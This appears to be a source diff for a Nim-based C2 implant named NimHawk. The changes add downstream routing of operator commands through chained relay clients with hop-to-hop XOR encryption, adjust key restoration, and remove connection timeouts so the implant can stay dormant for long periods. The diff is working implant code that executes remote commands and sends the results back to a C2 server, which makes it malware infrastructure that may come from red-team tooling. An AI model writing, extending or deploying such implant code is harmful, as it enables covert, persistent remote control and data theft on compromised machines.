@@ -1046,9 +1046,9 @@ proc httpHandler() {.async.} =
                                 if args.len > 0:
                                     echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
                             
-                                # SAFE KEY RESTORATION: Restore original listener ID and encryption key BEFORE processing response
-                                listener.id = originalId
-                                safeKeyRestore(listener, originalKey)
+                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key AFTER processing response
+                            listener.id = originalId
+                            safeKeyRestore(listener, originalKey)
                             
                             # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
                             clearSensitiveKey(relayClientKey)
@@ -1374,50 +1374,118 @@ proc httpHandler() {.async.} =
                         echo "[DEBUG] 🚫 HTTP Handler: Ignoring internal status message: " & cmd
                         echo "[DEBUG] 🚫 HTTP Handler: This is NOT a real command, skipping processing"
                 else:
-                    # Process ALL real commands locally (this is a normal implant!)
-                    when defined debug:
-                        echo "[DEBUG] 🌐 HTTP Handler: Processing command locally: " & cmd
-                    
-                    # ========== SUPER PROMINENT DEBUG START (HTTP HANDLER) ==========
-                    when defined debug:
-                        echo ""
-                        echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                        echo "⚡                                                                    ⚡"
-                        echo "⚡                     NIMHAWK HTTP HANDLER EXECUTION              ⚡"
-                        echo "⚡                                                                    ⚡"
-                        echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                        echo "🆔 IMPLANT ID OBTAINED: " & listener.id
-                        echo "🛤️  ROUTE: [DIRECT TO C2]"
-                        echo "📨 COMANDO RECIBIDO TRAS DECRYPT: " & cmd
-                        if args.len > 0:
-                            echo "📝 ARGUMENTOS: " & $args
-                        echo "🏷️  GUID: " & cmdGuid
-                        echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
-                        echo ""
-                    
-                    let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
-                    
-                    # ========== SUPER PROMINENT RESPONSE DEBUG (HTTP HANDLER) ==========
-                    when defined debug:
-                        echo ""
-                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                        echo "💥                                                                    💥"
-                        echo "💥                HTTP HANDLER COMANDO EJECUTADO - ENVIANDO RESPUESTA  💥"
-                        echo "💥                                                                    💥"
-                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                        echo "📤 RESPUESTA A ENVIAR PRE-ENCRYPT: " & result
-                        echo "🆔 IMPLANT ID: " & listener.id
-                        echo "🛤️  ROUTE: [DIRECT TO C2]"
-                        echo "🏷️  GUID: " & cmdGuid
-                        echo "📏 TAMAÑO RESPUESTA: " & $result.len & " bytes"
-                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                        echo ""
-                    webClientListener.postCommandResults(listener, cmdGuid, result)
+                    # INTELLIGENT ROUTING: Check if command is for this relay server or downstream routing
+                    let connectedClients = relay_commands.getConnectedClients(g_relayServer)
+                    let currentRelayServerID = getRelayServerID()
                     
                     when defined debug:
-                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
-                        echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
-                             (if result.len > 200: result[0..199] & "..." else: result)
+                        echo "[DEBUG] 🎯 INTELLIGENT ROUTING: Analyzing command destination"
+                        echo "[DEBUG] 🎯 - Current relay server ID: " & currentRelayServerID
+                        echo "[DEBUG] 🎯 - Command from C2: " & cmd
+                        echo "[DEBUG] 🎯 - Connected clients: [" & connectedClients.join(", ") & "]"
+                        echo "[DEBUG] 🎯 - Relay server listening: " & $g_relayServer.isListening
+                    
+                    # Check if command should be routed downstream to relay clients
+                    var shouldRouteDownstream = false
+                    var targetClientID = ""
+                    
+                    # Try to extract target client ID from command arguments
+                    if args.len > 0:
+                        # Look for target client ID in args (this might be sent by C2)
+                        let firstArg = args[0]
+                        if firstArg in connectedClients:
+                            shouldRouteDownstream = true
+                            targetClientID = firstArg
+                            when defined debug:
+                                echo "[DEBUG] 🎯 TARGET DETECTED: Command should be routed to client: " & targetClientID
+                    
+                    # If no explicit target found, but we have connected clients, check for implicit routing
+                    if not shouldRouteDownstream and connectedClients.len > 0:
+                        # For now, process commands locally on relay server
+                        # In the future, we could implement more sophisticated routing logic
+                        when defined debug:
+                            echo "[DEBUG] 🎯 NO EXPLICIT TARGET: Processing command locally on relay server"
+                    
+                    if shouldRouteDownstream and targetClientID != "":
+                        # DOWNSTREAM ROUTING: Send command to relay client
+                        when defined debug:
+                            echo "[DEBUG] 🎯 DOWNSTREAM ROUTING: Sending command to relay client: " & targetClientID
+                            echo "[DEBUG] 🎯 - Command: " & cmd
+                            echo "[DEBUG] 🎯 - GUID: " & cmdGuid
+                            echo "[DEBUG] 🎯 - Args: " & $args
+                        
+                        # Create command payload for relay client
+                        let commandPayload = %*{
+                            "cmdGuid": cmdGuid,
+                            "encrypted_command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
+                            "args": args
+                        }
+                        
+                        # Create command message with SHARED KEY (hop-to-hop encryption)
+                        let cmdMsg = createMessage(COMMAND,
+                            getRelayServerID(),
+                            @[targetClientID, currentRelayServerID],
+                            $commandPayload,
+                            false  # Use SHARED KEY (INITIAL_XOR_KEY) for hop-to-hop
+                        )
+                        
+                        # Send command to SPECIFIC relay client (unicast)
+                        let success = relay_commands.sendToClient(g_relayServer, targetClientID, cmdMsg)
+                        if success:
+                            when defined debug:
+                                echo "[DEBUG] 🎯 ✅ Command routed to relay client: " & targetClientID
+                        else:
+                            when defined debug:
+                                echo "[DEBUG] 🎯 ❌ Failed to route command to relay client: " & targetClientID
+                                echo "[DEBUG] 🎯 ❌ Falling back to local processing"
+                            # Fallback to local processing if routing fails
+                            shouldRouteDownstream = false
+                    
+                    if not shouldRouteDownstream:
+                        # LOCAL PROCESSING: Process command on relay server itself
+                        when defined debug:
+                            echo "[DEBUG] 🌐 LOCAL PROCESSING: Processing command on relay server"
+                        
+                        # ========== SUPER PROMINENT DEBUG START (HTTP HANDLER) ==========
+                        when defined debug:
+                            echo ""
+                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
+                            echo "⚡                                                                    ⚡"
+                            echo "⚡                     NIMHAWK HTTP HANDLER EXECUTION              ⚡"
+                            echo "⚡                                                                    ⚡"
+                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
+                            echo "🆔 IMPLANT ID OBTAINED: " & listener.id
+                            echo "🛤️  ROUTE: [DIRECT TO C2]"
+                            echo "📨 COMANDO RECIBIDO TRAS DECRYPT: " & cmd
+                            if args.len > 0:
+                                echo "📝 ARGUMENTOS: " & $args
+                            echo "🏷️  GUID: " & cmdGuid
+                            echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
+                            echo ""
+                        
+                        let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
+                        
+                        # ========== SUPER PROMINENT RESPONSE DEBUG (HTTP HANDLER) ==========
+                        when defined debug:
+                            echo ""
+                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
+                            echo "💥                                                                    💥"
+                            echo "💥                HTTP HANDLER COMANDO EJECUTADO - ENVIANDO RESPUESTA  💥"
+                            echo "💥                                                                    💥"
+                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
+                            echo "📤 RESPUESTA A ENVIAR PRE-ENCRYPT: " & result
+                            echo "🆔 IMPLANT ID: " & listener.id
+                            echo "🛤️  ROUTE: [DIRECT TO C2]"
+                            echo "🏷️  GUID: " & cmdGuid
+                            echo "📏 TAMAÑO RESPUESTA: " & $result.len & " bytes"
+                            echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
+                            echo ""
+                        webClientListener.postCommandResults(listener, cmdGuid, result)
+                        
+                        when defined debug:
+                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed locally and result sent to C2"
+                            echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
+                                 (if result.len > 200: result[0..199] & "..." else: result)
             
             # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
             let connectionStats = relay_commands.getConnectionStats(g_relayServer)
@@ -1872,6 +1940,10 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             echo "[DEBUG] ❌ └─────────────────────────────────┘"
                 
                 of HTTP_RESPONSE:
+                    # CRITICAL FIX: Update network health - we received a response successfully
+                    g_networkHealth.lastSuccessTime = epochTime().int64
+                    g_networkHealth.consecutiveErrors = 0
+                    
                     # This could be ID assignment or command result confirmation
                     let responsePayload = relay_protocol.smartDecrypt(msg.payload)
                     
@@ -1882,6 +1954,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message fromID: '" & msg.fromID & "' │"
                         echo "[DEBUG] 🔍 │ BROADCAST FILTER: My client ID: '" & g_relayClientID & "' │"
                         echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message route: " & $msg.route & " │"
+                        echo "[DEBUG] ⏰ │ 🎉 NETWORK HEALTH UPDATED - Timer reset! │"
                         echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                     
                     if responsePayload == "RESULT_SENT_TO_C2":
@@ -2156,20 +2229,9 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 g_waitingForConfirmationAck = false
                 g_confirmationAckTimeout = 0
             
-            # DEAD CONNECTION DETECTION: Check if we haven't received any response to our PULL requests
-            let timeSinceLastMessage = epochTime().int64 - g_networkHealth.lastSuccessTime
-            if messages.len == 0 and timeSinceLastMessage > 30:  # No messages for 30+ seconds
-                when defined debug:
-                    echo "[DEBUG] 🚨 ┌─────────── DEAD CONNECTION DETECTED ───────────┐"
-                    echo "[DEBUG] 🚨 │ No responses for " & $timeSinceLastMessage & " seconds │"
-                    echo "[DEBUG] 🚨 │ Assuming connection is dead │"
-                    echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
-                
-                # Force disconnect and reconnect
-                upstreamRelay.isConnected = false
-                # Skip sending PULL this cycle, will reconnect in next iteration
-                await sleepAsync(ERROR_RECOVERY_SLEEP)
-                continue
+            # NO MORE ARBITRARY TIMEOUTS! 
+            # Only disconnect on REAL socket errors, not on time-based assumptions
+            # An implant can go days/weeks without commands - this is NORMAL behavior
             
             # Send PULL message to request commands from relay server
             when defined debug:
